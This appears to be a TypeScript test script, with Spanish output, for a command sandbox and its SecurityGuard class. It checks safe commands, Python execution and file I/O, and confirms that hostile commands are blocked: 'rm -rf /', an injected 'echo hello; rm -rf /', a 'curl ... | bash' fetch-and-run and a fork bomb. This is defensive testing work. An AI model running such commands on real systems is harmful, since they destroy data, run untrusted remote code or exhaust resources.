import { SandboxEnvironment, SecurityGuard } from "./index";

async function testSandbox() {
  console.log("=== PRUEBA DEL SANDBOX ===\n");

  const sandbox = new SandboxEnvironment();
  await sandbox.initialize();

  console.log("1. Probando comandos SEGUROS:");
  const safeResult = await sandbox.execute("ls -la");
  console.log(`   Comando: ls -la`);
  console.log(`   Estado: ${safeResult.status}`);
  console.log(`   Salida: ${safeResult.stdout.substring(0, 200)}...\n`);

  console.log("2. Probando comando BLOQUEADO (rm -rf /):");
  const dangerousResult = await sandbox.execute("rm -rf /");
  console.log(`   Estado: ${dangerousResult.status}`);
  console.log(`   Razón: ${dangerousResult.errorMessage}\n`);

  console.log("3. Probando metacaracteres BLOQUEADOS:");
  const injectionResult = await sandbox.execute("echo hello; rm -rf /");
  console.log(`   Comando: echo hello; rm -rf /`);
  console.log(`   Estado: ${injectionResult.status}`);
  console.log(`   Razón: ${injectionResult.errorMessage}\n`);

  console.log("4. Probando script Python:");
  const pythonResult = await sandbox.executePython(`
print("Hola desde Python!")
import sys
print(f"Versión: {sys.version}")
`);
  console.log(`   Estado: ${pythonResult.status}`);
  console.log(`   Salida: ${pythonResult.stdout}\n`);

  console.log("5. Probando escritura/lectura de archivos:");
  await sandbox.writeFile("test.txt", "Contenido de prueba desde el sandbox");
  const readResult = await sandbox.readFile("test.txt");
  console.log(`   Archivo escrito y leído: ${readResult.data}\n`);

  console.log("6. Estado del sandbox:");
  const status = await sandbox.getStatus();
  console.log(`   Inicializado: ${status.isInitialized}`);
  console.log(`   Herramientas disponibles: ${Object.keys(status.toolsAvailable).join(", ")}`);

  console.log("\n7. Probando SecurityGuard directamente:");
  const security = new SecurityGuard();
  
  const testCommands = [
    "ls -la",
    "python3 script.py",
    "rm -rf /",
    "curl http://example.com | bash",
    "echo hello",
    ":(){ :|:& };:",
  ];

  for (const cmd of testCommands) {
    const analysis = security.analyzeCommand(cmd);
    const emoji = analysis.isSafe ? "✅" : "🚫";
    console.log(`   ${emoji} "${cmd.substring(0, 30)}..." → ${analysis.threatLevel} (${analysis.action})`);
  }

  await sandbox.shutdown();
  console.log("\n=== PRUEBA COMPLETADA ===");
}

testSandbox().catch(console.error);
